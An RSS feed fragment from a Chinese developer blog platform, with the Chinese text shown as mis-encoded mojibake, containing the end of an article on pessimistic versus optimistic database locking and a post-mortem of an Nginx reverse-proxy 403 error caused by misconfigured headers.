<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å¿…é¡»åœ¨äº‹åŠ¡ä¸­è¿›è¡Œï¼</span>
<span class="hljs-keyword">await</span> prisma.$transaction(<span class="hljs-keyword">async</span> (tx) =&gt; {
  <span class="hljs-comment">// 1. æŸ¥å¹¶åŠ é”ï¼ˆæ³¨æ„ï¼šè¿™é‡Œå¿…é¡»ä½¿ç”¨åŸç”Ÿ SQL æˆ–ç‰¹å®š ORM æ–¹æ³•ï¼‰</span>
  <span class="hljs-comment">// è¿™è¡Œä»£ç æ‰§è¡Œåï¼Œæ•°æ®åº“ä¼šç»™è¿™è¡Œæ•°æ®æŒ‚ä¸Šä¸€æŠŠâ€œæ’ä»–é”â€</span>
  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> tx.<span class="hljs-property">$queryRaw</span><span class="hljs-string">`SELECT * FROM "Product" WHERE id = <span class="hljs-subst">${id}</span> FOR UPDATE`</span>;
  
  <span class="hljs-keyword">if</span> (result[<span class="hljs-number">0</span>].<span class="hljs-property">stock</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'åº“å­˜ä¸è¶³'</span>);
  
  <span class="hljs-comment">// 2. æ›´æ–°</span>
  <span class="hljs-keyword">await</span> tx.<span class="hljs-property">product</span>.<span class="hljs-title function_">update</span>({ ... });
  
  <span class="hljs-comment">// 3. äº‹åŠ¡ç»“æŸ -&gt; é”è‡ªåŠ¨é‡Šæ”¾</span>
});
</code></pre>
<h3 data-id="heading-7">ğŸ”’ é”çš„é˜»å¡æœºåˆ¶ï¼ˆé‡ç‚¹ï¼‰</h3>
<p>å‡è®¾äº‹åŠ¡ A æ‹¿åˆ°äº†é”ï¼Œä¸”<strong>è¿˜æ²¡æäº¤</strong>ï¼Œæ­¤æ—¶äº‹åŠ¡ B å¦‚æœæƒ³æ“ä½œåŒä¸€è¡Œæ•°æ®ï¼Œä¼šé­é‡ä»¥ä¸‹æƒ…å†µï¼š</p>

























<table><thead><tr><th align="left">äº‹åŠ¡ B çš„æ“ä½œ</th><th align="left">ç»“æœ</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left"><strong>æ™®é€šæŸ¥è¯¢</strong><br/><code>SELECT * ...</code></td><td align="left"><strong>âœ… é€šè¡Œ</strong></td><td align="left"><strong>ä¸é˜»å¡</strong>ã€‚åŸºäº MVCC æœºåˆ¶ï¼ŒB ä¼šè¯»åˆ° A åŠ é”ä¹‹å‰çš„<strong>å†å²å¿«ç…§</strong>ã€‚è™½ç„¶è¯»ä¸åˆ°æœ€æ–°ä¿®æ”¹ï¼Œä½†ä¸ä¼šè¢«å¡ä½ã€‚</td></tr><tr><td align="left"><strong>æ‚²è§‚é”æŸ¥è¯¢</strong><br/><code>SELECT ... FOR UPDATE</code></td><td align="left"><strong>âŒ é˜»å¡</strong></td><td align="left"><strong>æ’é˜Ÿç­‰å¾…</strong>ã€‚B ä¹Ÿæƒ³ç”³è¯·é”ï¼Œä½†é”åœ¨ A æ‰‹é‡Œï¼Œå¿…é¡»ç­‰ A æäº¤æˆ–å›æ»šã€‚</td></tr><tr><td align="left"><strong>ä¿®æ”¹æ“ä½œ</strong><br/><code>UPDATE / DELETE</code></td><td align="left"><strong>âŒ é˜»å¡</strong></td><td align="left"><strong>æ’é˜Ÿç­‰å¾…</strong>ã€‚ä¿®æ”¹æ•°æ®éœ€è¦è·å–å†™é”ï¼Œå¿…é¡»ç­‰ A é‡Šæ”¾é”ã€‚</td></tr></tbody></table>
<h3 data-id="heading-8">é€‚ç”¨åœºæ™¯</h3>
<ul>
<li><strong>å†™å¤šè¯»å¤š</strong>ã€å¼ºä¸€è‡´æ€§è¦æ±‚é«˜ï¼ˆå¦‚ç§’æ€ã€é“¶è¡Œè½¬è´¦ï¼‰ã€‚</li>
<li><strong>ä»£ä»·</strong>ï¼šæ€§èƒ½è¾ƒå·®ï¼Œå®¹æ˜“é™ä½ç³»ç»Ÿååé‡ï¼Œå¤„ç†ä¸å½“å¯èƒ½å¯¼è‡´æ­»é”ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-9">å››ã€ è§£å†³æ–¹æ¡ˆä¸‰ï¼šä¹è§‚é”ï¼ˆOptimistic Lockingï¼‰</h2>
<p>å½“é€»è¾‘å¤æ‚å¿…é¡»åˆ†æ­¥æ‰§è¡Œï¼Œä¸”æ˜¯<strong>è¯»å¤šå†™å°‘ï¼ˆä½é¢‘å¹¶å‘å†™å…¥ï¼‰</strong> çš„åœºæ™¯æ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨<strong>ä¹è§‚é”</strong>ã€‚</p>
<h3 data-id="heading-10">å®ç°æ–¹å¼</h3>
<p>é€šå¸¸åœ¨æ•°æ®åº“è¡¨ä¸­å¢åŠ ä¸€ä¸ª <code>version</code> å­—æ®µã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. è¯»æ•°æ®ï¼ˆä¸åŠ é”ï¼‰</span>
<span class="hljs-keyword">const</span> product = <span class="hljs-keyword">await</span> repo.<span class="hljs-title function_">findOne</span>(id); <span class="hljs-comment">// å‡è®¾æ­¤æ—¶ version = 1</span>

<span class="hljs-comment">// 2. å†…å­˜è®¡ç®—</span>
<span class="hljs-keyword">const</span> newStock = product.<span class="hljs-property">stock</span> - <span class="hljs-number">1</span>;

<span class="hljs-comment">// 3. æ›´æ–°ï¼ˆå¸¦ç‰ˆæœ¬å·æ¡ä»¶ï¼‰ - CAS (Compare And Swap)</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> repo.<span class="hljs-title function_">update</span>(
  <span class="hljs-comment">// åªæœ‰å½“æ•°æ®åº“é‡Œçš„ version ä¾ç„¶ç­‰äºæˆ‘è¯»åˆ°çš„ 1 æ—¶ï¼Œæ‰æ›´æ–°</span>
  { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">version</span>: <span class="hljs-number">1</span> }, 
  { <span class="hljs-attr">stock</span>: newStock, <span class="hljs-attr">version</span>: <span class="hljs-number">2</span> }
);

<span class="hljs-comment">// 4. åˆ¤æ–­ç»“æœ</span>
<span class="hljs-keyword">if</span> (result.<span class="hljs-property">affected</span> === <span class="hljs-number">0</span>) {
  <span class="hljs-comment">// è¯´æ˜åœ¨ç¬¬1æ­¥å’Œç¬¬3æ­¥ä¹‹é—´ï¼Œæœ‰äººä¿®æ”¹äº†æ•°æ®</span>
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConflictException</span>(<span class="hljs-string">'æ‰‹æ…¢äº†ï¼Œæ•°æ®å·²è¢«ä¿®æ”¹'</span>);
}
</code></pre>
<h3 data-id="heading-11">å¤±è´¥åçš„ç­–ç•¥</h3>
<p>ä¹è§‚é”æ›´æ–°å¤±è´¥åï¼Œæœ‰ä¸¤ç§å¸¸è§å¤„ç†æ–¹å¼ï¼š</p>
<ol>
<li><strong>Fast Failï¼ˆå¿«é€Ÿå¤±è´¥ï¼‰</strong>ï¼šç›´æ¥æŠ¥é”™è¿”å›ç»™ç”¨æˆ·ï¼ˆå¦‚ï¼šâ€œå½“å‰å†…å®¹å·²è¢«ç¼–è¾‘ï¼Œè¯·åˆ·æ–°â€ï¼‰ã€‚é€‚åˆç”¨æˆ·ç¼–è¾‘è¡¨å•çš„åœºæ™¯ã€‚</li>
<li><strong>Retryï¼ˆè‡ªåŠ¨é‡è¯•ï¼‰</strong>ï¼šä»£ç é‡Œå†™ä¸ªå¾ªç¯ï¼Œé‡æ–°æŸ¥ä¸€éæœ€æ–°æ•°æ®å†è¯•ä¸€æ¬¡ã€‚é€‚åˆåº“å­˜æ‰£å‡ã€ç§¯åˆ†ç´¯åŠ ç­‰åœºæ™¯ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-12">äº”ã€ æ€»ç»“ä¸é€‰å‹æŒ‡å—</h2>
<p>åœ¨å¤„ç†â€œå¤šåŸå­åŒ–æ“ä½œâ€ï¼ˆå³æ— æ³•ç”¨å•æ¡ SQL è§£å†³çš„å¤æ‚ä¸šåŠ¡ï¼‰æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åšå¦‚ä¸‹å†³ç­–ï¼š</p>



































<table><thead><tr><th align="left">ç»´åº¦</th><th align="left">æ‚²è§‚é” (Pessimistic)</th><th align="left">ä¹è§‚é” (Optimistic)</th></tr></thead><tbody><tr><td align="left"><strong>æœºåˆ¶</strong></td><td align="left"><strong>å…ˆé”åå¹²</strong> (SELECT FOR UPDATE)</td><td align="left"><strong>å¹²å®Œå†æŸ¥</strong> (Version check)</td></tr><tr><td align="left"><strong>å¹¶å‘æ€§èƒ½</strong></td><td align="left">ä½ (ä¸²è¡Œæ’é˜Ÿ)</td><td align="left">é«˜ (å¹¶è¡Œå¥”è·‘)</td></tr><tr><td align="left"><strong>å†²çªå¤„ç†</strong></td><td align="left">é˜»å¡ç­‰å¾…</td><td align="left">æŠ¥é”™æˆ–é‡è¯•</td></tr><tr><td align="left"><strong>é€‚ç”¨åœºæ™¯</strong></td><td align="left"><strong>é«˜å¹¶å‘å†™ã€å¼ºç«äº‰</strong><br/>(ç§’æ€ã€æ”¯ä»˜)</td><td align="left"><strong>ä½å¹¶å‘å†™ã€è¯»å¤šå†™å°‘</strong><br/>(ç¼–è¾‘èµ„æ–™ã€CMSåå°)</td></tr><tr><td align="left"><strong>ç”Ÿæ´»ç±»æ¯”</strong></td><td align="left">åªæœ‰ä¸€ä¸ªå•æ‰€å‘ä½ï¼Œè¿›å»å°±åé”é—¨ï¼Œåé¢çš„äººæ’é˜Ÿã€‚</td><td align="left">å¼€æ”¾å¼æ–‡æ¡£ç¼–è¾‘ï¼Œæäº¤æ—¶å‘ç°ç‰ˆæœ¬è½åï¼Œéœ€è¦åˆå¹¶æˆ–é‡å†™ã€‚</td></tr></tbody></table>
<h3 data-id="heading-13">ğŸš€ æé€Ÿåˆ¤æ–­å¿ƒæ³•ï¼šå†³ç­–æµç¨‹å›¾</h3>
<ol>
<li>
<p><strong>å†™ä»£ç å‰é—®ä¸€å¥ï¼š</strong> ä¼šæœ‰ä¸¤ä¸ªäººåŒæ—¶æ“ä½œè¿™æ¡æ•°æ®å—ï¼Ÿ</p>
<ul>
<li><strong>No</strong> -&gt; éšä¾¿å†™ã€‚</li>
<li><strong>Yes</strong> -&gt; ç»§ç»­å¾€ä¸‹ã€‚</li>
</ul>
</li>
<li>
<p><strong>èƒ½ä¸€æ¡ SQL æ›´æ–°å—ï¼Ÿ</strong> (æ¯”å¦‚ <code>increment</code>)</p>
<ul>
<li><strong>Yes</strong> -&gt; ç”¨å®ƒï¼(åŸå­æ“ä½œï¼Œæœ€å®‰å…¨)</li>
<li><strong>No</strong> -&gt; ç»§ç»­å¾€ä¸‹ã€‚</li>
</ul>
</li>
<li>
<p><strong>åˆ¤æ–­ä¸šåŠ¡åœºæ™¯ï¼š</strong></p>
<ul>
<li><strong>å•çº¯å¤šæ­¥å†™</strong> (å¦‚ï¼šå…ˆ Insert Aï¼Œå† Update B)
<ul>
<li>ğŸ‘‰ <strong>çº¯äº‹åŠ¡</strong> (ä¿è¯åŸå­æ€§)ã€‚</li>
</ul>
</li>
<li><strong>å…ˆè¯»åå†™</strong> (å¦‚ï¼šCheck-then-Act)
<ul>
<li>ğŸ‘‰ <strong>ä¸Šé” + äº‹åŠ¡</strong>ã€‚æ ¹æ®ç«äº‰ç¨‹åº¦äºŒé€‰ä¸€ï¼š
<ul>
<li><strong>å†²çªé«˜/åæœä¸¥é‡</strong>ï¼ˆå¦‚åº“å­˜ã€é‡‘é¢ï¼‰ -&gt; <strong>æ‚²è§‚é”</strong> (<code>For Update</code>)ã€‚</li>
<li><strong>å†²çªä½/åæœè½»å¾®</strong>ï¼ˆå¦‚æç¤ºé‡è¯•ï¼‰ -&gt; <strong>ä¹è§‚é”</strong> (<code>version</code>)ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Nginx åå‘ä»£ç† 403 é—®é¢˜å¤ç›˜]]></title>    <link>https://juejin.cn/post/7582787460419338282</link>    <guid>https://juejin.cn/post/7582787460419338282</guid>    <pubDate>2025-12-13T05:42:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582787460419338282" data-draft-id="7582857981893984297" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Nginx åå‘ä»£ç† 403 é—®é¢˜å¤ç›˜"/> <meta itemprop="keywords" content="Nginx"/> <meta itemprop="datePublished" content="2025-12-13T05:42:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AlianNiew"/> <meta itemprop="url" content="https://juejin.cn/user/928405543463528"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Nginx åå‘ä»£ç† 403 é—®é¢˜å¤ç›˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/928405543463528/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AlianNiew
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T05:42:23.000Z" title="Sat Dec 13 2025 05:42:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Nginx åå‘ä»£ç† 403 é—®é¢˜å¤ç›˜</h2>
<h3 data-id="heading-1">ä¸€ã€é—®é¢˜ç°è±¡</h3>
<ul>
<li>æµè§ˆå™¨è®¿é—®ï¼š</li>
</ul>
<pre><code class="hljs language-perl" lang="perl">
[https:<span class="hljs-regexp">//</span>www.alancode.top/api/search?keyword=ç‹è²&amp;limit=<span class="hljs-number">5</span>](https:<span class="hljs-regexp">//</span>www.alancode.top/api/search?keyword=%E7%<span class="hljs-number">8</span>E%<span class="hljs-number">8</span>B%E8%<span class="hljs-number">8</span>F%B2&amp;limit=<span class="hljs-number">5</span>)

</code></pre>
<p>è¿”å› <strong>403 Forbidden</strong></p>
<ul>
<li>
<p>Nginx æ—¥å¿—æ˜¾ç¤ºï¼š</p>
</li>
<li>
<p>è¯·æ±‚å·²æˆåŠŸè½¬å‘åˆ°ä¸Šæ¸¸æœåŠ¡å™¨</p>
</li>
<li>
<p>çŠ¶æ€ç  <strong>200</strong></p>
</li>
<li>
<p>å“åº”ä½“é•¿åº¦ä¸º <strong>0</strong></p>
</li>
<li>
<p>ä¸Šæ¸¸æœåŠ¡å™¨ï¼ˆ60.204.147.98ï¼‰æ—¥å¿—æ˜¾ç¤ºï¼š</p>
</li>
<li>
<p>è¯·æ±‚æ­£å¸¸æ¥æ”¶</p>
</li>
<li>
<p>å†…éƒ¨è¯·æ±‚æˆåŠŸè¿”å›æ•°æ®ï¼ˆ200ï¼‰</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-2">äºŒã€é—®é¢˜æœ¬è´¨</h3>
<p><strong>è¯·æ±‚åˆ°è¾¾äº†ä¸Šæ¸¸ï¼Œå“åº”ä¹Ÿç”Ÿæˆäº†ï¼Œä½†åœ¨ Nginx åå‘ä»£ç†å±‚è¢«æ‹¦æˆª / ä¸¢å¼ƒï¼Œæœ€ç»ˆå¯¼è‡´å‰ç«¯æ”¶åˆ° 403ã€‚</strong></p>
<p>è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„ï¼š</p>
<blockquote>
<p><strong>Header é…ç½®é”™è¯¯å¯¼è‡´çš„åå‘ä»£ç†å±‚é—®é¢˜</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-3">ä¸‰ã€å…·ä½“é”™è¯¯ç‚¹</h3>
<h4 data-id="heading-4">1ï¸âƒ£ HTTP Header æ‹¼å†™é”™è¯¯ï¼ˆè‡´å‘½ï¼‰</h4>
<pre><code class="hljs language-nginx" lang="nginx">proxy_set_header X-For/warded-Proto $scheme;
</code></pre>
<ul>
<li>Header ååŒ…å« <code>/</code>ï¼Œå±äº <strong>éæ³• HTTP Header</strong></li>
<li>Nginx ä¸ä¼šæŠ¥é”™ï¼Œä½†è¯¥ Header ä¼šè¢«å¿½ç•¥</li>
<li>ä¸Šæ¸¸æœåŠ¡æ— æ³•è¯†åˆ«è¯·æ±‚æ¥æºåè®®ï¼ˆhttp / httpsï¼‰</li>
<li>åœ¨ HTTPS åœºæ™¯ä¸‹ï¼Œææ˜“è§¦å‘ <strong>403 / å¼ºåˆ¶æ‹’ç»</strong></li>
</ul>
<p>âœ… æ­£ç¡®å†™æ³•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">proxy_set_header X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;
</code></pre>
<hr/>
<h4 data-id="heading-5">2ï¸âƒ£ Host å¤´è½¬å‘é”™è¯¯ï¼ˆé«˜é¢‘è¸©å‘ç‚¹ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash">proxy_set_header Host <span class="hljs-variable">$host</span>;
</code></pre>
<ul>
<li>
<p><code>$host</code> æ˜¯å®¢æˆ·ç«¯è¯·æ±‚çš„åŸŸåï¼ˆå¦‚ <code>www.alancode.top</code>ï¼‰</p>
</li>
<li>
<p>ä½†çœŸå®ä¸Šæ¸¸æ˜¯ IP + ç«¯å£</p>
</li>
<li>
<p>å½“ä¸Šæ¸¸å­˜åœ¨ï¼š</p>
<ul>
<li>Host æ ¡éªŒ</li>
<li>é˜²ç›—é“¾</li>
<li>WAF / å®‰å…¨ç­–ç•¥</li>
</ul>
</li>
<li>
<p>å°±å¯èƒ½ç›´æ¥æ‹’ç»è¯·æ±‚ï¼ˆ403ï¼‰</p>
</li>
</ul>
<p>âœ… æ­£ç¡®å†™æ³•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">proxy_set_header Host <span class="hljs-variable">$proxy_host</span>;
</code></pre>
<p>æˆ–ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">proxy_set_header Host 60.204.147.98<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h4 data-id="heading-6">3ï¸âƒ£ è¡¨è±¡è¿·æƒ‘ç‚¹ï¼šNginx access log æ˜¾ç¤º 200</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"GET /search?... HTTP/1.0"</span> <span class="hljs-number">200</span> <span class="hljs-number">0</span>
</code></pre>
<ul>
<li><code>200</code>ï¼šè¯´æ˜ä¸Šæ¸¸è¿”å›æˆåŠŸ</li>
<li><code>0</code>ï¼šè¯´æ˜ <strong>å“åº”ä½“æœªæˆåŠŸè¿”å›ç»™å®¢æˆ·ç«¯</strong></li>
<li>å®é™…å“åº”åœ¨ä»£ç†å±‚è¢«ä¸­æ–­æˆ–æ‹’ç»</li>
</ul>
<p>âš ï¸ è¿™æ˜¯åå‘ä»£ç†é—®é¢˜çš„é‡è¦ä¿¡å·</p>
<hr/>
<h3 data-id="heading-7">å››ã€æœ€ç»ˆæ­£ç¡®é…ç½®</h3>
<pre><code class="hljs language-ini" lang="ini">location /api/ {
    proxy_pass http://60.204.147.98:15001/<span class="hljs-comment">;</span>

    proxy_http_version 1.1<span class="hljs-comment">;</span>

    proxy_set_header Host $proxy_host<span class="hljs-comment">;</span>
    proxy_set_header X-Real-IP $remote_addr<span class="hljs-comment">;</span>
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for<span class="hljs-comment">;</span>
    proxy_set_header X-Forwarded-Proto $scheme<span class="hljs-comment">;</span>

    proxy_redirect off<span class="hljs-comment">;</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-8">äº”ã€ç»éªŒæ€»ç»“ï¼ˆChecklistï¼‰</h3>
<ul>
<li>âŒ ä¸è¦éšæ„æ‹¼å†™ Header åï¼ˆNginx ä¸ä¸€å®šæŠ¥é”™ï¼‰</li>
<li>âŒ ä¸è¦ç›²ç›®ä½¿ç”¨ <code>$host</code> è½¬å‘ç»™ IP å‹ä¸Šæ¸¸</li>
<li>âœ… åå‘ä»£ç† HTTPS æ—¶ä¸€å®šè¦ä¼  <code>X-Forwarded-Proto</code></li>
<li>âœ… <code>200 + å“åº”ä½“ä¸º 0</code> é«˜æ¦‚ç‡æ˜¯ä»£ç†å±‚é—®é¢˜</li>
<li>âœ… å‡ºç° 403 æ—¶ï¼Œä¸è¦åªç›¯åç«¯æ—¥å¿—</li>
</ul>
<hr/>
<h3 data-id="heading-9">å…­ã€ä¸€å¥è¯æ€»ç»“</h3>
<blockquote>
<p><strong>åå‘ä»£ç†é—®é¢˜ï¼Œ80% æ˜¯ Headerï¼›403 ä¸ä¸€å®šæ˜¯åç«¯æ‹’ç»ï¼Œå¾ˆå¯èƒ½æ˜¯ Nginx å¸®ä½ â€œæŒ¡â€äº†è¯·æ±‚ã€‚</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨ PHP è§£æ Protobuf çš„å‘ä¸è§£æ³•]]></title>    <link>https://juejin.cn/post/7582849187865264179</link>    <guid>https://juejin.cn/post/7582849187865264179</guid>    <pubDate>2025-12-13T06:04:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582849187865264179" data-draft-id="7582815307440046131" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨ PHP è§£æ Protobuf çš„å‘ä¸è§£æ³•"/> <meta itemprop="keywords" content="PHP,protobuf"/> <meta itemprop="datePublished" content="2025-12-13T06:04:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‹ç¢ç‰"/> <meta itemprop="url" content="https://juejin.cn/user/3551890356308556"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨ PHP è§£æ Protobuf çš„å‘ä¸è§£æ³•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3551890356308556/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‹ç¢ç‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T06:04:26.000Z" title="Sat Dec 13 2025 06:04:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
